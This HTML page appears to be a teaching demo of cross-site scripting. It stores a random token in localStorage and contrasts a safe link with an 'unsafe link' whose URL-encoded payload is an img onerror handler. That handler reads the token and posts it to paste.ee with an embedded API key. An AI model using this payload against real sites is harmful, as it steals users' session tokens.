<html>
<head>
<script>
const genToken = () => localStorage.setItem('token', 't0k3n-' + Math.floor(Math.random()*10000000000000))
const updateTokenText = () => document.querySelector('#token').textContent = localStorage.getItem('token')
if (!localStorage.getItem('token')) {
	genToken()
}
</script>
</head>
<body>
<h1>Security</h1>
<h2>Your random token is: <span id="token"></span></h2>
<button id="genToken">Generate new token</button>
<h2>xss</h2>
<p><a href="xss.html?name=rowan&company=cybersecurity">Safe link</a></p>
<p><a href="xss.html?name=rowan&company=%3Cimg%20src%3D%22oops%22%20onerror%3D%22%0Aconst%20data%20%3D%20new%20FormData()%0Adata.append(%27key%27%2C%20%271011255a1edeb2fff38a08f9aa332847%27)%0Adata.append(%27description%27%2C%20%27example%20xss%27)%0Adata.append(%27paste%27%2C%20localStorage.getItem(%27token%27))%0Adata.append(%27format%27%2C%20%27json%27)%0A%0Afetch(%27http%3A%2F%2Fpaste.ee%2Fapi%27%2C%20%7B%0A%09method%3A%20%27POST%27%2C%0A%09body%3A%20data%2C%0A%7D).then(response%20%3D%3E%20response.json())%0A%09.then(json%20%3D%3E%20alert(%27Stolen%20token.%20Check%3A%20%27%20%2B%20json.paste.link))%22%0A%2F%3E">Unsafe link</a></p>

<script>
document.querySelector('#token').textContent = localStorage.getItem('token')
document.querySelector('#genToken').addEventListener('click', () => {
	console.log('clicked')
	genToken()
	window.setTimeout(updateTokenText, 200)
})
</script>
</body>
</html>